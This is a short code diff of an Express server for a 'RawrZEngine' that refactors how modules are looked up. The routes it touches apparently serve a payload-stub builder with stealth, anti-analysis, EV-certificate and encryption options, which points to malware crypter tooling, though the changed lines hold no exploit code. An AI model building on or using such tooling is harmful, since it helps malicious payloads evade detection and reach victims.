@@ -62,7 +62,7 @@ app.post('/generate-stub', async (req, res) => {
         const { target, stubType, encryptionMethod, stealthFeatures, antiAnalysisFeatures, evCertFeatures, hotpatchFeatures, payload, outputFormat, extension, customOptions } = req.body;
         
         // Route to stub-generator engine
-        const module = RawrZEngine.getLoadedModule('stub-generator');
+        const module = RawrZEngine.modules.get('stub-generator');
         const result = await module.generateStub(target, {
             stubType,
             encryptionMethod,
@@ -562,7 +562,7 @@ app.post('/api/rawrz-engine/execute', async (req, res) => {
                     const module = await RawrZEngine.loadModule('camellia-assembly');
                     result = await module.compileAssembly(params.code, params.platform, params.options || {});
                 } else if (action === 'getStatus') {
-                    const module = RawrZEngine.getLoadedModule('camellia-assembly');
+                    const module = RawrZEngine.modules.get('camellia-assembly');
                     result = module.getStatus();
                 }
                 break;
@@ -606,7 +606,7 @@ app.post('/api/rawrz-engine/execute', async (req, res) => {
                     const module = await RawrZEngine.loadModule('dual-crypto-engine');
                     result = await module.dualEncrypt(params.data, params.algorithms, params.options || {});
                 } else if (action === 'getStatus') {
-                    const module = RawrZEngine.getLoadedModule('dual-crypto-engine');
+                    const module = RawrZEngine.modules.get('dual-crypto-engine');
                     result = module.getStatus();
                 }
                 break;
@@ -628,7 +628,7 @@ app.post('/api/rawrz-engine/execute', async (req, res) => {
                     const module = await RawrZEngine.loadModule('ev-cert-encryptor');
                     result = await module.evEncrypt(params.data, params.certificate, params.options || {});
                 } else if (action === 'getStatus') {
-                    const module = RawrZEngine.getLoadedModule('ev-cert-encryptor');
+                    const module = RawrZEngine.modules.get('ev-cert-encryptor');
                     result = module.getStatus();
                 }
                 break;
